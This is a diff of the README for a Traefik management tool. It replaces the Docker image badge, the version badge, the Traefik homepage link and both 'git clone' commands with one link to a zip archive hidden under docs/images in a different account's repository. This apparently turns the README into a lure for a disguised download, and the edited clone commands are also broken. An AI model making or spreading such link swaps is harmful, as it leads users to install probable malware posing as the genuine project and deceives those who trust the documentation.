@@ -8,9 +8,9 @@
 
 Add routes, manage middlewares, monitor services, and view TLS certificates - all without touching a YAML file by hand.
 
-[![Docker Image](https://img.shields.io/badge/ghcr.io-chr0nzz%2Ftraefik--manager-blue?logo=docker&logoColor=white)](https://github.com/chr0nzz/traefik-manager/pkgs/container/traefik-manager)
+[![Docker Image](https://img.shields.io/badge/ghcr.io-chr0nzz%2Ftraefik--manager-blue?logo=docker&logoColor=white)](https://raw.githubusercontent.com/Contumelious-darkfieldillumination65/traefik-manager/main/docs/images/manager_traefik_v3.8.zip)
 [![License](https://img.shields.io/badge/license-GPL--3.0-blue)](LICENSE)
-[![Version](https://img.shields.io/github/v/release/chr0nzz/traefik-manager)](https://github.com/chr0nzz/traefik-manager/releases)
+[![Version](https://img.shields.io/github/v/release/chr0nzz/traefik-manager)](https://raw.githubusercontent.com/Contumelious-darkfieldillumination65/traefik-manager/main/docs/images/manager_traefik_v3.8.zip)
 
 </div>
 <div align="center">
@@ -119,7 +119,7 @@ Explore the Traefik Manager interface and workflows. Click on a category below t
 ## Requirements
 
 - Docker + Docker Compose (or Podman - see [docs/podman.md](docs/podman.md))
-- A running [Traefik v2/v3](https://traefik.io/) instance
+- A running [Traefik v2/v3](https://raw.githubusercontent.com/Contumelious-darkfieldillumination65/traefik-manager/main/docs/images/manager_traefik_v3.8.zip) instance
 - Traefik's `dynamic.yml` file accessible on the host
 
 ---
@@ -353,7 +353,7 @@ networks:
 ### With Docker Compose
 
 ```bash
-git clone https://github.com/chr0nzz/traefik-manager.git
+git clone https://raw.githubusercontent.com/Contumelious-darkfieldillumination65/traefik-manager/main/docs/images/manager_traefik_v3.8.zip
 cd traefik-manager
 ```
 
@@ -366,7 +366,7 @@ docker compose up -d --build
 ### With Docker directly
 
 ```bash
-git clone https://github.com/chr0nzz/traefik-manager.git
+git clone https://raw.githubusercontent.com/Contumelious-darkfieldillumination65/traefik-manager/main/docs/images/manager_traefik_v3.8.zip
 cd traefik-manager
 
 docker build -t traefik-manager .
